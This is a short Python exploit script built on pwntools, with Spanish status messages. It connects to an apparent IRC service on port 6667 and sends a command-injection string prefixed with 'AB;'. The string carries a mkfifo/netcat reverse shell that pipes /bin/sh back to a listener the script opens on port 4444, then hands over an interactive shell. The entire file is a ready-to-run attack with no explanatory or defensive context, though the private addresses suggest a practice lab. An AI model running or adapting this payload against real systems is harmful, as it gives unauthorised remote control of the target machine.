import requests
import signal
import sys
import socket
import threading

from pwn import *

def def_handler(sig,frame):
	print("\[!] Saliendo ...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# variables gloables
lport=4444

def makeRequest():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.62.120", 6667))

	response = s.recv(1024)
	print(response)

	p1.status("Inyectando comando malicioso")

	s.send("AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.62 4444 >/tmp/f\n".encode())


if __name__=="__main__":

	p1=log.progress("Payload")

	try:
		threading.Thread(target=makeRequest, args=()).start()

	except Exception as e:
		log.error(str(e))

	shell = listen(lport, timeout=20).wait_for_connection()

	if shell.sock is None:
		p1.failure("No ha sido posible ganar acceso al sistema")
	else:
		p1.success("Se ha obtenido una conexion")

	shell.interactive()
